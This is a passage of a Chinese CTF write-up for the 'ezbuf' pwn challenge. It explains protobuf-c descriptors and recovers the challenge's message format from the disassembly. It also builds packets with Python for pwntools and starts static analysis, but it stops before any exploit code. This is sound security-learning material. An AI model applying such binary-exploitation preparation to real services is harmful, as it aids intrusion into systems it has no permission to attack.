+<p>Protobuf是一种与语言无关、与平台无关的可扩展机制，用于序列化结构化数据。它类似于 JSON，但体积更小、速度更快，并且会生成本机语言绑定。您只需定义一次数据的结构，然后就可以使用专门生成的源代码轻松地将结构化数据写入各种数据流并使用各种语言读取这些结构化数据。</p>
+<p>它支持以下语言</p>
+<ul>
+<li>C++</li>
+<li>C#</li>
+<li>Java</li>
+<li>Kotlin</li>
+<li>Objective-C</li>
+<li>PHP</li>
+<li>Python</li>
+<li>Ruby</li>
+</ul>
+<p>其他语言(如C语言)需要额外安装插件，本题是一个c语言程序，用到了插件protobuf-c</p>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 首先安装依赖</span><br><span class="hljs-built_in">sudo</span> apt install git g++ autoconf automake libtool curl make unzip<br><br><span class="hljs-comment"># 安装 protobuf</span><br><span class="hljs-built_in">cd</span> ~ <span class="hljs-comment"># 切换到一个合适的位置</span><br>git <span class="hljs-built_in">clone</span> https://github.com/protocolbuffers/protobuf.git<br><span class="hljs-built_in">cd</span> protobuf<br>git checkout v3.21.0 <span class="hljs-comment"># 试过v27.0，protobuf-c装不上，所以用v3.21.0</span><br>git submodule update --init --recursive <span class="hljs-comment"># 安装子模块</span><br>./autogen.sh   <span class="hljs-comment">#生成配置脚本</span><br>./configure    <span class="hljs-comment"># 可选 --prefix=path ，默认路径为/usr/local/</span><br>make -j 4          <br><span class="hljs-built_in">sudo</span> make install <br><span class="hljs-built_in">sudo</span> ldconfig       <span class="hljs-comment"># refresh shared library cache</span><br><span class="hljs-built_in">which</span> protoc        <span class="hljs-comment"># find the location</span><br>protoc --version    <span class="hljs-comment"># check</span><br><br><span class="hljs-comment"># 安装 protobuf-c</span><br><span class="hljs-built_in">cd</span> ~ <span class="hljs-comment"># 切换到一个合适的位置</span><br>git <span class="hljs-built_in">clone</span> https://github.com/protobuf-c/protobuf-c.git<br><span class="hljs-built_in">cd</span> protobuf-c<br>./autogen.sh<br>./configure<br>make -j 4<br><span class="hljs-built_in">sudo</span> make install<br><br><span class="hljs-comment"># 安装python的protobuf支持</span><br>pip install protobuf<br><br><span class="hljs-comment"># 如果之后在使用中出现 </span><br><span class="hljs-comment"># ImportError: cannot import name &#x27;builder&#x27; from &#x27;google.protobuf.internal&#x27;</span><br><span class="hljs-comment"># 先执行一下，一般都能解决问题</span><br>pip install --upgrade protobuf<br></code></pre></td></tr></table></figure>
+
+<p>之后我们会使用 protoc 生成 python 语言的结构化数据，便于利用 pwntools 发送数据</p>
+<h4 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h4><p>首先我们新建一个.proto文件，利用protoc生成一个c语言的代码，查看生成的文件，进一步了解protobuf</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Protobuf">syntax=<span class="hljs-string">&quot;proto3&quot;</span>; <span class="hljs-comment">//proto version 2 or 3</span><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">test</span>&#123;<br>    <span class="hljs-type">bytes</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">sint64</span> b = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">uint64</span> c = <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>将上述内容保存为test.proto文件，使用<code>protoc test.proto --c_out=./</code>生成相应的c语言代码<br>下面是生成出的文件的一部分代码，其中包含两个重要的结构体：ProtobufCFieldDescriptor和ProtobufCMessageDescriptor</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="hljs-number">3</span>] =<br>&#123;<br>  &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-number">1</span>,<br>    PROTOBUF_C_LABEL_NONE,<br>    PROTOBUF_C_TYPE_BYTES,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(Test, a),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;b&quot;</span>,<br>    <span class="hljs-number">2</span>,<br>    PROTOBUF_C_LABEL_NONE,<br>    PROTOBUF_C_TYPE_SINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(Test, b),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>  &#123;<br>    <span class="hljs-string">&quot;c&quot;</span>,<br>    <span class="hljs-number">3</span>,<br>    PROTOBUF_C_LABEL_NONE,<br>    PROTOBUF_C_TYPE_UINT64,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(Test, c),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span class="hljs-comment">/* flags */</span><br>    <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved1,reserved2, etc */</span><br>  &#125;,<br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> test__field_indices_by_name[] = &#123;<br>  <span class="hljs-number">0</span>,   <span class="hljs-comment">/* field[0] = a */</span><br>  <span class="hljs-number">1</span>,   <span class="hljs-comment">/* field[1] = b */</span><br>  <span class="hljs-number">2</span>,   <span class="hljs-comment">/* field[2] = c */</span><br>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">const</span> ProtobufCIntRange test__number_ranges[<span class="hljs-number">1</span> + <span class="hljs-number">1</span>] =<br>&#123;<br>  &#123; <span class="hljs-number">1</span>, <span class="hljs-number">0</span> &#125;,<br>  &#123; <span class="hljs-number">0</span>, <span class="hljs-number">3</span> &#125;<br>&#125;;<br><span class="hljs-type">const</span> ProtobufCMessageDescriptor test__descriptor =<br>&#123;<br>  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,<br>  <span class="hljs-string">&quot;test&quot;</span>,<br>  <span class="hljs-string">&quot;Test&quot;</span>,<br>  <span class="hljs-string">&quot;Test&quot;</span>,<br>  <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-keyword">sizeof</span>(Test),<br>  <span class="hljs-number">3</span>,<br>  test__field_descriptors,<br>  test__field_indices_by_name,<br>  <span class="hljs-number">1</span>,  test__number_ranges,<br>  (ProtobufCMessageInit) test__init,<br>  <span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>    <span class="hljs-comment">/* reserved[123] */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>我们查看这两个结构体的源码</p>
+<ul>
+<li>ProtobufCMessageDescriptor</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Describes a message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCMessageDescriptor</span> &#123;</span><br>	<span class="hljs-comment">/** Magic value checked to ensure that the API is used correctly. */</span><br>	<span class="hljs-type">uint32_t</span>			magic;<br><br>	<span class="hljs-comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*name;<br>	<span class="hljs-comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*short_name;<br>	<span class="hljs-comment">/** Identifier used in generated C code. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*c_name;<br>	<span class="hljs-comment">/** The dot-separated namespace. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>			*package_name;<br><br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * Size in bytes of the C structure representing an instance of this</span><br><span class="hljs-comment">	 * type of message.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">size_t</span>				sizeof_message;<br><br>	<span class="hljs-comment">/** Number of elements in `fields`. */</span><br>	<span class="hljs-type">unsigned</span>			n_fields;<br>	<span class="hljs-comment">/** Field descriptors, sorted by tag number. */</span><br>	<span class="hljs-type">const</span> ProtobufCFieldDescriptor	*fields;<br>	<span class="hljs-comment">/** Used for looking up fields by name. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span>			*fields_sorted_by_name;<br><br>	<span class="hljs-comment">/** Number of elements in `field_ranges`. */</span><br>	<span class="hljs-type">unsigned</span>			n_field_ranges;<br>	<span class="hljs-comment">/** Used for looking up fields by id. */</span><br>	<span class="hljs-type">const</span> ProtobufCIntRange		*field_ranges;<br><br>	<span class="hljs-comment">/** Message initialisation function. */</span><br>	ProtobufCMessageInit		message_init;<br><br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>				*reserved1;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>				*reserved2;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>				*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>ProtobufCFieldDescriptor</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCFieldDescriptor</span> &#123;</span><br>	<span class="hljs-comment">/** Name of the field as given in the .proto file. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>		*name;<br>	<span class="hljs-comment">/** Tag value of the field as given in the .proto file. */</span><br>	<span class="hljs-type">uint32_t</span>		id;<br>	<span class="hljs-comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span><br>	ProtobufCLabel		label;<br>	<span class="hljs-comment">/** The type of the field. */</span><br>	ProtobufCType		type;<br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span><br><span class="hljs-comment">	 * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span><br><span class="hljs-comment">	 * for repeated members or the case enum for oneofs).</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">unsigned</span>		quantifier_offset;<br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * The offset in bytes into the message&#x27;s C structure for the member</span><br><span class="hljs-comment">	 * itself.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">unsigned</span>		offset;<br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * A type-specific descriptor.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span><br><span class="hljs-comment">	 * corresponding `ProtobufCEnumDescriptor`.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span><br><span class="hljs-comment">	 * the corresponding `ProtobufCMessageDescriptor`.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * Otherwise this field is NULL.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">void</span>		*descriptor; <span class="hljs-comment">/* for MESSAGE and ENUM types */</span><br>	<span class="hljs-comment">/** The default value for this field, if defined. May be NULL. */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">void</span>		*default_value;<br>	<span class="hljs-comment">/**</span><br><span class="hljs-comment">	 * A flag word. Zero or more of the bits defined in the</span><br><span class="hljs-comment">	 * `ProtobufCFieldFlag` enum may be set.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-type">uint32_t</span>		flags;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">unsigned</span>		reserved_flags;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>			*reserved2;<br>	<span class="hljs-comment">/** Reserved for future use. */</span><br>	<span class="hljs-type">void</span>			*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>结构体中又涉及到了一个枚举类型 ProtobufCType</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>	PROTOBUF_C_TYPE_INT32,      <span class="hljs-comment">/**&lt; int32 */</span><br>	PROTOBUF_C_TYPE_SINT32,     <span class="hljs-comment">/**&lt; signed int32 */</span><br>	PROTOBUF_C_TYPE_SFIXED32,   <span class="hljs-comment">/**&lt; signed int32 (4 bytes) */</span><br>	PROTOBUF_C_TYPE_INT64,      <span class="hljs-comment">/**&lt; int64 */</span><br>	PROTOBUF_C_TYPE_SINT64,     <span class="hljs-comment">/**&lt; signed int64 */</span><br>	PROTOBUF_C_TYPE_SFIXED64,   <span class="hljs-comment">/**&lt; signed int64 (8 bytes) */</span><br>	PROTOBUF_C_TYPE_UINT32,     <span class="hljs-comment">/**&lt; unsigned int32 */</span><br>	PROTOBUF_C_TYPE_FIXED32,    <span class="hljs-comment">/**&lt; unsigned int32 (4 bytes) */</span><br>	PROTOBUF_C_TYPE_UINT64,     <span class="hljs-comment">/**&lt; unsigned int64 */</span><br>	PROTOBUF_C_TYPE_FIXED64,    <span class="hljs-comment">/**&lt; unsigned int64 (8 bytes) */</span><br>	PROTOBUF_C_TYPE_FLOAT,      <span class="hljs-comment">/**&lt; float */</span><br>	PROTOBUF_C_TYPE_DOUBLE,     <span class="hljs-comment">/**&lt; double */</span><br>	PROTOBUF_C_TYPE_BOOL,       <span class="hljs-comment">/**&lt; boolean */</span><br>	PROTOBUF_C_TYPE_ENUM,       <span class="hljs-comment">/**&lt; enumerated type */</span><br>	PROTOBUF_C_TYPE_STRING,     <span class="hljs-comment">/**&lt; UTF-8 or ASCII string */</span><br>	PROTOBUF_C_TYPE_BYTES,      <span class="hljs-comment">/**&lt; arbitrary byte sequence */</span><br>	PROTOBUF_C_TYPE_MESSAGE,    <span class="hljs-comment">/**&lt; nested message */</span><br>&#125; ProtobufCType;<br></code></pre></td></tr></table></figure>
+
+<p>更多相关信息请查看 <a target="_blank" rel="noopener" href="https://github.com/protobuf-c/protobuf-c">protobuf-c源码仓库</a>、<a target="_blank" rel="noopener" href="https://protobuf-c.github.io/protobuf-c">protobuf-c官方文档</a></p>
+<p>现在我们得知了消息的结构体 ProtobufCMessageDescriptor<br>也得知消息中所有成员的结构体 ProtobufCFieldDescriptor<br>还有每个成员的类型 ProtobufCType<br>利用这两个结构体和这个类型枚举便可以开始逆向程序，还原protobuf结构体了</p>
+<h3 id="程序逆向"><a href="#程序逆向" class="headerlink" title="程序逆向"></a>程序逆向</h3><h4 id="protobuf-message逆向"><a href="#protobuf-message逆向" class="headerlink" title="protobuf message逆向"></a>protobuf message逆向</h4><p>分析ProtobufCMessageDescriptor<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-ProtobufCMessageDescriptor.png" srcset="/img/loading.gif" lazyload></p>
+<p>我在ida中还原了 ProtobufCMessageDescriptor 结构体，便于观察，实际做题可以不用还原<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-structure-insert.png" srcset="/img/loading.gif" lazyload></p>
+<p>再将之前数据段的变量的类型转为该结构体，得到如下结果<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-data-struct.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现n_fileds为5,表明其中含有5个变量，点进fields分析每个field</p>
+<p><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-ProtobufCFieldDescriptor-field1.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析出第一个变量为bytes型，名为whatcon的变量，按照这样的方法依次提取出所有field，写到heybro.proto文件中</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">syntax</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;proto3&quot;</span><span class="hljs-comment">; //proto version 2 or 3</span><br><br>message heybro&#123;<br>    bytes whatcon <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>    sint64 whattodo <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    sint64 whatidx <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>    sint64 whatsize <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>    uint32 whatsthis <span class="hljs-operator">=</span> <span class="hljs-number">5</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>利用<code>protoc heybro.proto --python_out=./</code>命令生成python语言的代码，得到一个python文件，可以在exp中导入，构建相应的protobuf包</p>
+<p>生成的heybro_pb2.py文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><br><span class="hljs-comment"># source: heybro.proto</span><br><span class="hljs-string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> google.protobuf.internal <span class="hljs-keyword">import</span> builder <span class="hljs-keyword">as</span> _builder<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> descriptor <span class="hljs-keyword">as</span> _descriptor<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> descriptor_pool <span class="hljs-keyword">as</span> _descriptor_pool<br><span class="hljs-keyword">from</span> google.protobuf <span class="hljs-keyword">import</span> symbol_database <span class="hljs-keyword">as</span> _symbol_database<br><span class="hljs-comment"># @@protoc_insertion_point(imports)</span><br><br>_sym_db = _symbol_database.Default()<br><br><br><br><br>DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="hljs-string">b&#x27;\n\x0cheybro.proto\&quot;a\n\x06heybro\x12\x0f\n\x07whatcon\x18\x01 \x01(\x0c\x12\x10\n\x08whattodo\x18\x02 \x01(\x12\x12\x0f\n\x07whatidx\x18\x03 \x01(\x12\x12\x10\n\x08whatsize\x18\x04 \x01(\x12\x12\x11\n\twhatsthis\x18\x05 \x01(\rb\x06proto3&#x27;</span>)<br><br>_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, <span class="hljs-built_in">globals</span>())<br>_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="hljs-string">&#x27;heybro_pb2&#x27;</span>, <span class="hljs-built_in">globals</span>())<br><span class="hljs-keyword">if</span> _descriptor._USE_C_DESCRIPTORS == <span class="hljs-literal">False</span>:<br><br>  DESCRIPTOR._options = <span class="hljs-literal">None</span><br>  _HEYBRO._serialized_start=<span class="hljs-number">16</span><br>  _HEYBRO._serialized_end=<span class="hljs-number">113</span><br><span class="hljs-comment"># @@protoc_insertion_point(module_scope)</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="python使用protobuf"><a href="#python使用protobuf" class="headerlink" title="python使用protobuf"></a>python使用protobuf</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> heybro_pb2 <span class="hljs-comment"># 不要加.py</span><br>data = heybro_pb2.heybro() <span class="hljs-comment"># 方法名称跟随.proto中结构体名称变化</span><br>data.whattodo = todo<br>data.whatcon = content<br>data.whatidx = index<br>data.whatsize = size<br>data.whatsthis = this<br>data.SerializeToString() <span class="hljs-comment"># 转换成bytes</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>先看看主函数，稍微改了点名字，加了点注释<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-main.png" srcset="/img/loading.gif" lazyload></p>
+<p>再看看menu函数<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-menu.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以看到，程序读取输入，然后调用sub_1C87()解包数据，这个函数会直接调用另一个函数<br><img src="/img/post/ciscn2024/ciscn2024-%E5%88%9D%E8%B5%9B-wp/ciscn2024-ezbuf-sub_1C87.png" srcset="/img/loading.gif" lazyload></p>
+<p>我已经给这个函数改名了，这个函数是protobuf_c_message_unpack函数</p>
+<p>protobuf_c_message_unpack函数的源码，可以粗略看看，主要是看看这个函数对堆有没有影响</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 